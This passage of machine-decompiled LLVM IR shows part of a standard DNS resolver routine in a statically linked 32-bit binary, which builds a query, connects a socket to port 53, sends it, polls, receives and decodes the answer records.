  %v2_80658ff = add i32 %v1_80658ff, 220
  %v3_80658ff = inttoptr i32 %v2_80658ff to i32*
  store i32 %v0_80658ff, i32* %v3_80658ff, align 4
  %v0_8065906 = load i32, i32* @esp, align 4
  %v0_8065909 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065909 = add i32 %v0_8065906, 8
  %v3_8065909 = inttoptr i32 %v2_8065909 to i32*
  store i32 %v0_8065909, i32* %v3_8065909, align 4
  %v1_806590a = load i32, i32* @ebx, align 4
  %v2_806590a = add i32 %v1_806590a, %v2_80656f2
  %v2_806590e = add i32 %v0_8065906, 4
  %v3_806590e = inttoptr i32 %v2_806590e to i32*
  store i32 %v2_806590a, i32* %v3_806590e, align 4
  %v1_806590f = add i32 %v0_8065906, 216
  store i32 %v1_806590f, i32* @eax, align 4
  %v3_8065916 = inttoptr i32 %v0_8065906 to i32*
  store i32 %v1_806590f, i32* %v3_8065916, align 4
  %v0_8065917 = call i32 @__encode_question()
  store i32 %v0_8065917, i32* %eax.global-to-local, align 4
  %v0_806591c = load i32, i32* @esp, align 4
  %v2_806591f = icmp slt i32 %v0_8065917, 0
  store i32 %v0_8065917, i32* @esi, align 4
  br i1 %v2_806591f, label %dec_label_pc_8065d85, label %dec_label_pc_8065929

dec_label_pc_8065929:                             ; preds = %dec_label_pc_80658ca
  %v1_8065929 = add i32 %v0_806591c, 172
  %v2_8065929 = inttoptr i32 %v1_8065929 to i16*
  store i16 2, i16* %v2_8065929, align 2
  %v1_8065933 = load i32, i32* @esp, align 4
  %v2_8065933 = add i32 %v1_8065933, -4
  %v3_8065933 = inttoptr i32 %v2_8065933 to i32*
  store i32 %v0_8065917, i32* %v3_8065933, align 4
  %v1_8065934 = add i32 %v1_8065933, 164
  store i32 %v1_8065934, i32* %eax.global-to-local, align 4
  %v2_806593b = add i32 %v1_8065933, -8
  %v3_806593b = inttoptr i32 %v2_806593b to i32*
  store i32 %v1_8065934, i32* %v3_806593b, align 4
  %v1_806593c = add i32 %v1_8065933, 32
  %v2_806593c = inttoptr i32 %v1_806593c to i32*
  %v3_806593c = load i32, i32* %v2_806593c, align 4
  %v5_806593c = add i32 %v1_8065933, -12
  %v6_806593c = inttoptr i32 %v5_806593c to i32*
  store i32 %v3_806593c, i32* %v6_806593c, align 4
  %v1_8065940 = add i32 %v1_8065933, -16
  %v2_8065940 = inttoptr i32 %v1_8065940 to i32*
  store i32 10, i32* %v2_8065940, align 4
  %v4_8065942 = call i32 @inet_pton(i32 -1, i8* %v3_8065942, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065942, i32* %eax.global-to-local, align 4
  %v0_8065947 = load i32, i32* @esp, align 4
  %v1_8065947 = add i32 %v0_8065947, 16
  %tmp47 = icmp slt i32 %v4_8065942, 1
  br i1 %tmp47, label %dec_label_pc_8065958, label %dec_label_pc_806594e

dec_label_pc_806594e:                             ; preds = %dec_label_pc_8065929
  %v1_806594e = add i32 %v0_8065947, 172
  %v2_806594e = inttoptr i32 %v1_806594e to i16*
  store i16 10, i16* %v2_806594e, align 2
  %v0_8065958.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8065958

dec_label_pc_8065958:                             ; preds = %dec_label_pc_8065929, %dec_label_pc_806594e
  %v0_806596f = phi i32 [ %v1_8065947, %dec_label_pc_8065929 ], [ %v0_8065958.pre, %dec_label_pc_806594e ]
  %v1_8065958 = add i32 %v0_806596f, 156
  %v2_8065958 = inttoptr i32 %v1_8065958 to i16*
  %v3_8065958 = load i16, i16* %v2_8065958, align 2
  %v12_8065958 = icmp eq i16 %v3_8065958, 10
  %v1_8065961 = icmp eq i1 %v12_8065958, false
  %v1_806596f = add i32 %v0_806596f, 158
  %v2_806596f = inttoptr i32 %v1_806596f to i16*
  store i16 13568, i16* %v2_806596f, align 2
  %v0_8065979 = load i32, i32* @esp, align 4
  br i1 %v1_8065961, label %dec_label_pc_806596f, label %dec_label_pc_806598f

dec_label_pc_806596f:                             ; preds = %dec_label_pc_8065958
  %v1_806597c = add i32 %v0_8065979, 32
  %v2_806597c = inttoptr i32 %v1_806597c to i32*
  %v3_806597c = load i32, i32* %v2_806597c, align 4
  %v5_806597c = add i32 %v0_8065979, -16
  %v6_806597c = inttoptr i32 %v5_806597c to i32*
  store i32 %v3_806597c, i32* %v6_806597c, align 4
  %v1_8065980 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8065980, i32* %eax.global-to-local, align 4
  %v1_8065985 = load i32, i32* @esp, align 4
  %v2_8065985 = add i32 %v1_8065985, 176
  %v3_8065985 = inttoptr i32 %v2_8065985 to i32*
  store i32 %v1_8065980, i32* %v3_8065985, align 4
  %v0_806598c = load i32, i32* @esp, align 4
  %v1_806598c = add i32 %v0_806598c, 16
  br label %dec_label_pc_806598f

dec_label_pc_806598f:                             ; preds = %dec_label_pc_8065958, %dec_label_pc_806596f
  %v1_806598f = phi i32 [ %v1_806598c, %dec_label_pc_806596f ], [ %v0_8065979, %dec_label_pc_8065958 ]
  %v0_806598f = load i32, i32* @ecx, align 4
  %v2_806598f = add i32 %v1_806598f, -4
  %v3_806598f = inttoptr i32 %v2_806598f to i32*
  store i32 %v0_806598f, i32* %v3_806598f, align 4
  %v1_8065990 = add i32 %v1_806598f, -8
  %v2_8065990 = inttoptr i32 %v1_8065990 to i32*
  store i32 17, i32* %v2_8065990, align 4
  %v1_8065992 = add i32 %v1_806598f, -12
  %v2_8065992 = inttoptr i32 %v1_8065992 to i32*
  store i32 2, i32* %v2_8065992, align 4
  %v1_8065994 = add i32 %v1_806598f, 156
  %v2_8065994 = inttoptr i32 %v1_8065994 to i16*
  %v3_8065994 = load i16, i16* %v2_8065994, align 2
  %v4_8065994 = zext i16 %v3_8065994 to i32
  store i32 %v4_8065994, i32* %eax.global-to-local, align 4
  %v2_806599c = add i32 %v1_806598f, -16
  %v3_806599c = inttoptr i32 %v2_806599c to i32*
  store i32 %v4_8065994, i32* %v3_806599c, align 4
  %v3_806599d = call i32 @socket(i32 -1, i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_806599d, i32* %eax.global-to-local, align 4
  %v1_80659a2 = load i32, i32* @esp, align 4
  %v2_80659a2 = add i32 %v1_80659a2, 36
  %v3_80659a2 = inttoptr i32 %v2_80659a2 to i32*
  store i32 %v3_806599d, i32* %v3_80659a2, align 4
  %v0_80659a6 = load i32, i32* @esp, align 4
  %v1_80659a6 = add i32 %v0_80659a6, 16
  %v0_80659a9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80659a9 = icmp slt i32 %v0_80659a9, 0
  br i1 %v2_80659a9, label %dec_label_pc_80659d6, label %dec_label_pc_80659ad

dec_label_pc_80659ad:                             ; preds = %dec_label_pc_806598f
  %v1_80659ad = add i32 %v0_80659a6, 172
  store i32 %v1_80659ad, i32* %eax.global-to-local, align 4
  %v0_80659b4 = load i32, i32* @edx, align 4
  %v2_80659b4 = add i32 %v0_80659a6, 12
  %v3_80659b4 = inttoptr i32 %v2_80659b4 to i32*
  store i32 %v0_80659b4, i32* %v3_80659b4, align 4
  %v1_80659b5 = add i32 %v0_80659a6, 8
  %v2_80659b5 = inttoptr i32 %v1_80659b5 to i32*
  store i32 28, i32* %v2_80659b5, align 4
  %v0_80659b7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80659b7 = add i32 %v0_80659a6, 4
  %v3_80659b7 = inttoptr i32 %v2_80659b7 to i32*
  store i32 %v0_80659b7, i32* %v3_80659b7, align 4
  %v1_80659b8 = add i32 %v0_80659a6, 36
  %v2_80659b8 = inttoptr i32 %v1_80659b8 to i32*
  %v3_80659b8 = load i32, i32* %v2_80659b8, align 4
  %v6_80659b8 = inttoptr i32 %v0_80659a6 to i32*
  store i32 %v3_80659b8, i32* %v6_80659b8, align 4
  %v3_80659bc = call i32 @__libc_connect(i32 -1, i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80659bc, i32* %eax.global-to-local, align 4
  %v0_80659c1 = load i32, i32* @esp, align 4
  %v2_80659c4 = icmp slt i32 %v3_80659bc, 0
  %v1_80659c6 = icmp eq i1 %v2_80659c4, false
  br i1 %v1_80659c6, label %dec_label_pc_80659df, label %dec_label_pc_80659c8

dec_label_pc_80659c8:                             ; preds = %dec_label_pc_80659ad
  %v1_80659c8 = call i32 @__errno_location(i32 -1)
  store i32 %v1_80659c8, i32* %eax.global-to-local, align 4
  %v1_80659cd = inttoptr i32 %v1_80659c8 to i32*
  %v2_80659cd = load i32, i32* %v1_80659cd, align 4
  %v11_80659cd = icmp eq i32 %v2_80659cd, 101
  %v0_8065d3f.pre = load i32, i32* @esp, align 4
  br i1 %v11_80659cd, label %dec_label_pc_8065d3f, label %dec_label_pc_80659d6

dec_label_pc_80659d6:                             ; preds = %dec_label_pc_80659c8, %dec_label_pc_806598f
  %v17_80659d6 = phi i32 [ %v1_80659a6, %dec_label_pc_806598f ], [ %v0_8065d3f.pre, %dec_label_pc_80659c8 ]
  %v1_80659d6 = add i32 %v17_80659d6, 28
  %v2_80659d6 = inttoptr i32 %v1_80659d6 to i32*
  %v3_80659d6 = load i32, i32* %v2_80659d6, align 4
  %v4_80659d6 = add i32 %v3_80659d6, 1
  store i32 %v4_80659d6, i32* %v2_80659d6, align 4
  br label %dec_label_pc_8065d60.backedge

dec_label_pc_80659df:                             ; preds = %dec_label_pc_80659ad
  %v1_80659df = add i32 %v0_80659c1, 12
  %v2_80659df = inttoptr i32 %v1_80659df to i32*
  store i32 0, i32* %v2_80659df, align 4
  %v0_80659e1 = load i32, i32* @ebx, align 4
  %v1_80659e1 = load i32, i32* @esi, align 4
  %v2_80659e1 = add i32 %v1_80659e1, %v0_80659e1
  store i32 %v2_80659e1, i32* %eax.global-to-local, align 4
  %v2_80659e4 = add i32 %v0_80659c1, 8
  %v3_80659e4 = inttoptr i32 %v2_80659e4 to i32*
  store i32 %v2_80659e1, i32* %v3_80659e4, align 4
  %v2_80659e5 = add i32 %v0_80659c1, 4
  %v3_80659e5 = inttoptr i32 %v2_80659e5 to i32*
  store i32 %v2_80656f2, i32* %v3_80659e5, align 4
  %v1_80659e6 = add i32 %v0_80659c1, 36
  %v2_80659e6 = inttoptr i32 %v1_80659e6 to i32*
  %v3_80659e6 = load i32, i32* %v2_80659e6, align 4
  %v6_80659e6 = inttoptr i32 %v0_80659c1 to i32*
  store i32 %v3_80659e6, i32* %v6_80659e6, align 4
  %v4_80659ea = call i32 @__libc_send(i32 -1, i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80659ea, i32* %eax.global-to-local, align 4
  %v0_80659ef = load i32, i32* @esp, align 4
  %v1_80659ef = add i32 %v0_80659ef, 36
  %v2_80659ef = inttoptr i32 %v1_80659ef to i32*
  %v3_80659ef = load i32, i32* %v2_80659ef, align 4
  store i32 %v3_80659ef, i32* %eax.global-to-local, align 4
  %v1_80659f3 = add i32 %v0_80659ef, 232
  %v2_80659f3 = inttoptr i32 %v1_80659f3 to i16*
  store i16 1, i16* %v2_80659f3, align 2
  %v0_80659fd = load i32, i32* %eax.global-to-local, align 4
  %v1_80659fd = load i32, i32* @esp, align 4
  %v2_80659fd = add i32 %v1_80659fd, 228
  %v3_80659fd = inttoptr i32 %v2_80659fd to i32*
  store i32 %v0_80659fd, i32* %v3_80659fd, align 4
  %v0_8065a04 = load i32, i32* @esp, align 4
  %v1_8065a07 = add i32 %v0_8065a04, 8
  %v2_8065a07 = inttoptr i32 %v1_8065a07 to i32*
  store i32 10000, i32* %v2_8065a07, align 4
  %v1_8065a0c = add i32 %v0_8065a04, 4
  %v2_8065a0c = inttoptr i32 %v1_8065a0c to i32*
  store i32 1, i32* %v2_8065a0c, align 4
  %v1_8065a0e = add i32 %v0_8065a04, 228
  store i32 %v1_8065a0e, i32* %eax.global-to-local, align 4
  %v3_8065a15 = inttoptr i32 %v0_8065a04 to i32*
  store i32 %v1_8065a0e, i32* %v3_8065a15, align 4
  %v4_8065a16 = call i32 @__libc_poll(%pollfd* inttoptr (i32 -1 to %pollfd*), i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065a16, i32* %eax.global-to-local, align 4
  %v0_8065a1b = load i32, i32* @esp, align 4
  %v1_8065a1b = add i32 %v0_8065a1b, 16
  %tmp48 = icmp slt i32 %v4_8065a16, 1
  br i1 %tmp48, label %dec_label_pc_8065d3f, label %dec_label_pc_8065a26

dec_label_pc_8065a26:                             ; preds = %dec_label_pc_80659df
  %v1_8065a26 = add i32 %v0_8065a1b, 12
  %v2_8065a26 = inttoptr i32 %v1_8065a26 to i32*
  store i32 0, i32* %v2_8065a26, align 4
  %v1_8065a28 = add i32 %v0_8065a1b, 8
  %v2_8065a28 = inttoptr i32 %v1_8065a28 to i32*
  store i32 512, i32* %v2_8065a28, align 4
  %v2_8065a2d = add i32 %v0_8065a1b, 4
  %v3_8065a2d = inttoptr i32 %v2_8065a2d to i32*
  store i32 %v2_80656f2, i32* %v3_8065a2d, align 4
  %v1_8065a2e = add i32 %v0_8065a1b, 36
  %v2_8065a2e = inttoptr i32 %v1_8065a2e to i32*
  %v3_8065a2e = load i32, i32* %v2_8065a2e, align 4
  %v6_8065a2e = inttoptr i32 %v0_8065a1b to i32*
  store i32 %v3_8065a2e, i32* %v6_8065a2e, align 4
  %v4_8065a32 = call i32 @__libc_recv(i32 -1, i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065a32, i32* %eax.global-to-local, align 4
  %v1_8065a37 = load i32, i32* @esp, align 4
  %v2_8065a37 = add i32 %v1_8065a37, 32
  %v3_8065a37 = inttoptr i32 %v2_8065a37 to i32*
  store i32 %v4_8065a32, i32* %v3_8065a37, align 4
  %v0_8065a3b = load i32, i32* @esp, align 4
  %v1_8065a3b = add i32 %v0_8065a3b, 16
  %v7_8065a41 = icmp sgt i32 %v4_8065a32, 11
  br i1 %v7_8065a41, label %dec_label_pc_8065a47, label %dec_label_pc_8065cf4

dec_label_pc_8065a47:                             ; preds = %dec_label_pc_8065a26
  %v0_8065a47 = load i32, i32* @ebx, align 4
  %v2_8065a47 = add i32 %v0_8065a3b, 12
  %v3_8065a47 = inttoptr i32 %v2_8065a47 to i32*
  store i32 %v0_8065a47, i32* %v3_8065a47, align 4
  %v0_8065a48 = load i32, i32* @ebx, align 4
  %v2_8065a48 = add i32 %v0_8065a3b, 8
  %v3_8065a48 = inttoptr i32 %v2_8065a48 to i32*
  store i32 %v0_8065a48, i32* %v3_8065a48, align 4
  %v1_8065a49 = add i32 %v0_8065a3b, 84
  store i32 %v1_8065a49, i32* %eax.global-to-local, align 4
  %v2_8065a4d = add i32 %v0_8065a3b, 4
  %v3_8065a4d = inttoptr i32 %v2_8065a4d to i32*
  store i32 %v1_8065a49, i32* %v3_8065a4d, align 4
  %v3_8065a4e = inttoptr i32 %v0_8065a3b to i32*
  store i32 %v2_80656f2, i32* %v3_8065a4e, align 4
  %v0_8065a4f = call i32 @__decode_header()
  store i32 %v0_8065a4f, i32* %eax.global-to-local, align 4
  %v0_8065a54 = load i32, i32* @esp, align 4
  %v1_8065a54 = add i32 %v0_8065a54, 84
  %v2_8065a54 = inttoptr i32 %v1_8065a54 to i32*
  %v3_8065a54 = load i32, i32* %v2_8065a54, align 4
  store i32 %v3_8065a54, i32* %edx.global-to-local, align 4
  %v2_8065a58 = add i32 %v0_8065a54, 60
  %v3_8065a58 = inttoptr i32 %v2_8065a58 to i32*
  store i32 %v3_8065a54, i32* %v3_8065a58, align 4
  %v0_8065a5c = load i32, i32* @esp, align 4
  %v1_8065a5c = add i32 %v0_8065a5c, 16
  %v1_8065a5f = add i32 %v0_8065a5c, 72
  %v2_8065a5f = inttoptr i32 %v1_8065a5f to i32*
  %v3_8065a5f = load i32, i32* %v2_8065a5f, align 4
  store i32 %v3_8065a5f, i32* %eax.global-to-local, align 4
  %v0_8065a63 = load i32, i32* %edx.global-to-local, align 4
  %v12_8065a63 = icmp eq i32 %v0_8065a63, %v3_8065a5f
  %v1_8065a65 = icmp eq i1 %v12_8065a63, false
  br i1 %v1_8065a65, label %dec_label_pc_8065cf4, label %dec_label_pc_8065a6b

dec_label_pc_8065a6b:                             ; preds = %dec_label_pc_8065a47
  %v1_8065a6b = add i32 %v0_8065a5c, 88
  %v2_8065a6b = inttoptr i32 %v1_8065a6b to i32*
  %v3_8065a6b = load i32, i32* %v2_8065a6b, align 4
  %v4_8065a6b = icmp eq i32 %v3_8065a6b, 0
  br i1 %v4_8065a6b, label %dec_label_pc_8065cf4, label %dec_label_pc_8065a76

dec_label_pc_8065a76:                             ; preds = %dec_label_pc_8065a6b
  %v1_8065a76 = add i32 %v0_8065a5c, 112
  %v2_8065a76 = inttoptr i32 %v1_8065a76 to i32*
  %v3_8065a76 = load i32, i32* %v2_8065a76, align 4
  store i32 %v3_8065a76, i32* %eax.global-to-local, align 4
  %v9_8065a7a = icmp eq i32 %v3_8065a76, 3
  %v1_8065a7d = icmp eq i1 %v9_8065a7a, false
  br i1 %v1_8065a7d, label %dec_label_pc_8065ae5, label %dec_label_pc_8065a7f

dec_label_pc_8065a7f:                             ; preds = %dec_label_pc_8065a76
  %v1_8065a7f = add i32 %v0_8065a5c, 67
  %v2_8065a7f = inttoptr i32 %v1_8065a7f to i8*
  %v3_8065a7f = load i8, i8* %v2_8065a7f, align 1
  %v4_8065a7f = icmp eq i8 %v3_8065a7f, 0
  %v1_8065a84 = icmp eq i1 %v4_8065a7f, false
  br i1 %v1_8065a84, label %dec_label_pc_8065ad5, label %dec_label_pc_8065a86

dec_label_pc_8065a86:                             ; preds = %dec_label_pc_8065a7f
  %v0_8065a86 = load i32, i32* @ecx, align 4
  %v2_8065a86 = add i32 %v0_8065a5c, 12
  %v3_8065a86 = inttoptr i32 %v2_8065a86 to i32*
  store i32 %v0_8065a86, i32* %v3_8065a86, align 4
  %v1_8065a87 = add i32 %v0_8065a5c, 8
  %v2_8065a87 = inttoptr i32 %v1_8065a87 to i32*
  store i32 ptrtoint (i32* @global_var_8075680.674 to i32), i32* %v2_8065a87, align 4
  %v1_8065a8c = add i32 %v0_8065a5c, 4
  %v2_8065a8c = inttoptr i32 %v1_8065a8c to i32*
  store i32 134589241, i32* %v2_8065a8c, align 4
  %v1_8065a91 = add i32 %v0_8065a5c, 200
  store i32 %v1_8065a91, i32* @esi, align 4
  %v3_8065a98 = inttoptr i32 %v0_8065a5c to i32*
  store i32 %v1_8065a91, i32* %v3_8065a98, align 4
  %v4_8065a99 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065a99, i32* %eax.global-to-local, align 4
  %v0_8065a9e = load i32, i32* @esp, align 4
  %v1_8065a9e = inttoptr i32 %v0_8065a9e to i32*
  store i32 ptrtoint (i32* @global_var_8075680.674 to i32), i32* %v1_8065a9e, align 4
  %v1_8065aa5 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8065aa5, i32* %eax.global-to-local, align 4
  %v0_8065aaa = load i32, i32* @global_var_807f844.774, align 4
  %v0_8065ab0 = load i32, i32* @esp, align 4
  %v1_8065ab0 = inttoptr i32 %v0_8065ab0 to i32*
  %v2_8065ab0 = load i32, i32* %v1_8065ab0, align 4
  store i32 %v2_8065ab0, i32* %eax.global-to-local, align 4
  %v3_8065ab0 = add i32 %v0_8065ab0, 4
  %v1_8065ab1 = inttoptr i32 %v3_8065ab0 to i32*
  %v2_8065ab1 = load i32, i32* %v1_8065ab1, align 4
  store i32 %v2_8065ab1, i32* %edx.global-to-local, align 4
  %v1_8065ab2 = add i32 %v0_8065aaa, -1
  store i32 %v1_8065ab2, i32* @ebx, align 4
  store i32 1, i32* %v1_8065ab1, align 4
  %v0_8065ab5 = load i32, i32* @esi, align 4
  store i32 %v0_8065ab5, i32* %v1_8065ab0, align 4
  %v3_8065ab6 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065780)
  store i32 %v3_8065ab6, i32* %eax.global-to-local, align 4
  %v0_8065abb = load i32, i32* @esp, align 4
  %v1_8065abe = add i32 %v0_8065abb, 52
  %v2_8065abe = inttoptr i32 %v1_8065abe to i32*
  %v3_8065abe = load i32, i32* %v2_8065abe, align 4
  %v4_8065abe = load i32, i32* @ebx, align 4
  %v5_8065abe = sub i32 %v3_8065abe, %v4_8065abe
  %v11_8065abe = xor i32 %v4_8065abe, %v3_8065abe
  %v12_8065abe = xor i32 %v5_8065abe, %v3_8065abe
  %v13_8065abe = and i32 %v12_8065abe, %v11_8065abe
  %v14_8065abe = icmp slt i32 %v13_8065abe, 0
  %v16_8065abe = icmp slt i32 %v5_8065abe, 0
  %v2_8065ac2 = icmp eq i1 %v16_8065abe, %v14_8065abe
  br i1 %v2_8065ac2, label %dec_label_pc_8065ad5, label %dec_label_pc_8065ac4

dec_label_pc_8065ac4:                             ; preds = %dec_label_pc_8065a86
  %v1_8065ac4 = add i32 %v0_8065abb, 60
  %v2_8065ac4 = inttoptr i32 %v1_8065ac4 to i32*
  %v3_8065ac4 = load i32, i32* %v2_8065ac4, align 4
  store i32 %v3_8065ac4, i32* %edx.global-to-local, align 4
  %v3_8065ac8 = load i32, i32* %v2_8065abe, align 4
  %v4_8065ac8 = add i32 %v3_8065ac8, 1
  store i32 %v4_8065ac8, i32* %v2_8065abe, align 4
  %v0_8065acc = load i32, i32* %edx.global-to-local, align 4
  %v1_8065acc = load i32, i32* @esp, align 4
  %v2_8065acc = add i32 %v1_8065acc, 56
  %v3_8065acc = inttoptr i32 %v2_8065acc to i32*
  store i32 %v0_8065acc, i32* %v3_8065acc, align 4
  br label %dec_label_pc_8065d60.backedge

dec_label_pc_8065ad5:                             ; preds = %dec_label_pc_8065a86, %dec_label_pc_8065a7f
  %v0_8065ad5 = call i32 @__GI___h_errno_location()
  store i32 %v0_8065ad5, i32* %eax.global-to-local, align 4
  %v1_8065ada = inttoptr i32 %v0_8065ad5 to i32*
  store i32 1, i32* %v1_8065ada, align 4
  br label %dec_label_pc_8065d98

dec_label_pc_8065ae5:                             ; preds = %dec_label_pc_8065a76
  %v1_8065ae5 = icmp eq i32 %v3_8065a76, 0
  %v1_8065ae7 = icmp eq i1 %v1_8065ae5, false
  br i1 %v1_8065ae7, label %dec_label_pc_8065cf4, label %dec_label_pc_8065aed

dec_label_pc_8065aed:                             ; preds = %dec_label_pc_8065ae5
  %v1_8065aed = add i32 %v0_8065a5c, 120
  %v2_8065aed = inttoptr i32 %v1_8065aed to i32*
  %v3_8065aed = load i32, i32* %v2_8065aed, align 4
  %tmp49 = icmp slt i32 %v3_8065aed, 1
  br i1 %tmp49, label %dec_label_pc_8065afd, label %dec_label_pc_8065af4

dec_label_pc_8065af4:                             ; preds = %dec_label_pc_8065aed
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8065b1c

dec_label_pc_8065afd:                             ; preds = %dec_label_pc_8065aed
  %v0_8065afd = call i32 @__GI___h_errno_location()
  store i32 %v0_8065afd, i32* %eax.global-to-local, align 4
  %v1_8065b02 = inttoptr i32 %v0_8065afd to i32*
  store i32 4, i32* %v1_8065b02, align 4
  br label %dec_label_pc_8065d98

dec_label_pc_8065b0d:                             ; preds = %dec_label_pc_8065b1c
  %v2_8065b0d = add i32 %v0_8065b24, -4
  %v3_8065b0d = inttoptr i32 %v2_8065b0d to i32*
  store i32 %v0_8065b0d, i32* %v3_8065b0d, align 4
  %v0_8065b0e = load i32, i32* @ebx, align 4
  %v1_8065b0e = add i32 %v0_8065b0e, 1
  store i32 %v1_8065b0e, i32* @ebx, align 4
  %v0_8065b0f = load i32, i32* %eax.global-to-local, align 4
  %v2_8065b0f = add i32 %v0_8065b24, -8
  %v3_8065b0f = inttoptr i32 %v2_8065b0f to i32*
  store i32 %v0_8065b0f, i32* %v3_8065b0f, align 4
  %v0_8065b10 = load i32, i32* @esi, align 4
  %v2_8065b10 = add i32 %v0_8065b24, -12
  %v3_8065b10 = inttoptr i32 %v2_8065b10 to i32*
  store i32 %v0_8065b10, i32* %v3_8065b10, align 4
  %v2_8065b11 = add i32 %v0_8065b24, -16
  %v3_8065b11 = inttoptr i32 %v2_8065b11 to i32*
  store i32 %v2_80656f2, i32* %v3_8065b11, align 4
  %v0_8065b12 = call i32 @__length_question()
  store i32 %v0_8065b12, i32* %eax.global-to-local, align 4
  %v0_8065b17 = load i32, i32* @esp, align 4
  %v1_8065b17 = add i32 %v0_8065b17, 16
  %v0_8065b1a = load i32, i32* @esi, align 4
  %v2_8065b1a = add i32 %v0_8065b1a, %v0_8065b12
  %v0_8065b1c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8065b1c

dec_label_pc_8065b1c:                             ; preds = %dec_label_pc_8065af4, %dec_label_pc_8065b0d
  %v0_8065b0d = phi i32 [ %v3_8065a76, %dec_label_pc_8065af4 ], [ %v0_8065b12, %dec_label_pc_8065b0d ]
  %v0_8065b24 = phi i32 [ %v1_8065a5c, %dec_label_pc_8065af4 ], [ %v1_8065b17, %dec_label_pc_8065b0d ]
  %v0_8065b1c = phi i32 [ 0, %dec_label_pc_8065af4 ], [ %v0_8065b1c.pre, %dec_label_pc_8065b0d ]
  %storemerge = phi i32 [ 12, %dec_label_pc_8065af4 ], [ %v2_8065b1a, %dec_label_pc_8065b0d ]
  store i32 %storemerge, i32* @esi, align 4
  %v2_8065b1c = add i32 %v0_8065b24, 100
  %v3_8065b1c = inttoptr i32 %v2_8065b1c to i32*
  %v4_8065b1c = load i32, i32* %v3_8065b1c, align 4
  %v5_8065b1c = sub i32 %v0_8065b1c, %v4_8065b1c
  %v11_8065b1c = xor i32 %v4_8065b1c, %v0_8065b1c
  %v12_8065b1c = xor i32 %v5_8065b1c, %v0_8065b1c
  %v13_8065b1c = and i32 %v12_8065b1c, %v11_8065b1c
  %v14_8065b1c = icmp slt i32 %v13_8065b1c, 0
  %v16_8065b1c = icmp slt i32 %v5_8065b1c, 0
  %v2_8065b20 = icmp eq i1 %v16_8065b1c, %v14_8065b1c
  br i1 %v2_8065b20, label %dec_label_pc_8065b22, label %dec_label_pc_8065b0d

dec_label_pc_8065b22:                             ; preds = %dec_label_pc_8065b1c
  store i32 0, i32* @ebx, align 4
  %v1_8065b24 = add i32 %v0_8065b24, 27
  %v2_8065b24 = inttoptr i32 %v1_8065b24 to i8*
  store i8 1, i8* %v2_8065b24, align 1
  %v0_8065c52.pre = load i32, i32* @ebx, align 4
  %v1_8065c52.pre = load i32, i32* @esp, align 4
  %v2_8065c5255 = add i32 %v1_8065c52.pre, 104
  %v3_8065c5256 = inttoptr i32 %v2_8065c5255 to i32*
  %v4_8065c5257 = load i32, i32* %v3_8065c5256, align 4
  %v5_8065c5258 = sub i32 %v0_8065c52.pre, %v4_8065c5257
  %v11_8065c5260 = xor i32 %v4_8065c5257, %v0_8065c52.pre
  %v12_8065c5261 = xor i32 %v5_8065c5258, %v0_8065c52.pre
  %v13_8065c5262 = and i32 %v12_8065c5261, %v11_8065c5260
  %v14_8065c5263 = icmp slt i32 %v13_8065c5262, 0
  %v16_8065c5265 = icmp slt i32 %v5_8065c5258, 0
  %v2_8065c5666 = icmp eq i1 %v16_8065c5265, %v14_8065c5263
  br i1 %v2_8065c5666, label %dec_label_pc_8065c62, label %dec_label_pc_8065c58.lr.ph

dec_label_pc_8065c58.lr.ph:                       ; preds = %dec_label_pc_8065b22
  %v0_8065c58.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8065c58

dec_label_pc_8065b2e:                             ; preds = %dec_label_pc_8065c58
  %v1_8065b2e = add i32 %v0_8065b2e67, 116
  store i32 %v1_8065b2e, i32* %eax.global-to-local, align 4
  %v2_8065b32 = add i32 %v0_8065b2e67, -4
  %v3_8065b32 = inttoptr i32 %v2_8065b32 to i32*
  store i32 %v1_8065b2e, i32* %v3_8065b32, align 4
  %v3_8065b33 = load i32, i32* %v3_8065c58, align 4
  %v5_8065b33 = add i32 %v0_8065b2e67, -8
  %v6_8065b33 = inttoptr i32 %v5_8065b33 to i32*
  store i32 %v3_8065b33, i32* %v6_8065b33, align 4
  %v0_8065b37 = load i32, i32* @esi, align 4
  %v2_8065b37 = add i32 %v0_8065b2e67, -12
  %v3_8065b37 = inttoptr i32 %v2_8065b37 to i32*
  store i32 %v0_8065b37, i32* %v3_8065b37, align 4
  %v2_8065b38 = add i32 %v0_8065b2e67, -16
  %v3_8065b38 = inttoptr i32 %v2_8065b38 to i32*
  store i32 %v2_80656f2, i32* %v3_8065b38, align 4
  %v0_8065b39 = call i32 @__decode_answer()
  store i32 %v0_8065b39, i32* %eax.global-to-local, align 4
  %v1_8065b3e = load i32, i32* @esp, align 4
  %v2_8065b3e = add i32 %v1_8065b3e, 68
  %v3_8065b3e = inttoptr i32 %v2_8065b3e to i32*
  store i32 %v0_8065b39, i32* %v3_8065b3e, align 4
  %v0_8065b42 = load i32, i32* @esp, align 4
  %v1_8065b42 = add i32 %v0_8065b42, 16
  %v2_8065b45 = icmp slt i32 %v0_8065b39, 0
  %v1_8065b47 = icmp eq i1 %v2_8065b45, false
  br i1 %v1_8065b47, label %dec_label_pc_8065b61, label %dec_label_pc_8065b49

dec_label_pc_8065b49:                             ; preds = %dec_label_pc_8065b2e
  %v0_8065b49 = load i32, i32* @ebx, align 4
  %v1_8065b49 = icmp eq i32 %v0_8065b49, 0
  br i1 %v1_8065b49, label %dec_label_pc_8065cf4, label %dec_label_pc_8065b51

dec_label_pc_8065b51:                             ; preds = %dec_label_pc_8065b49
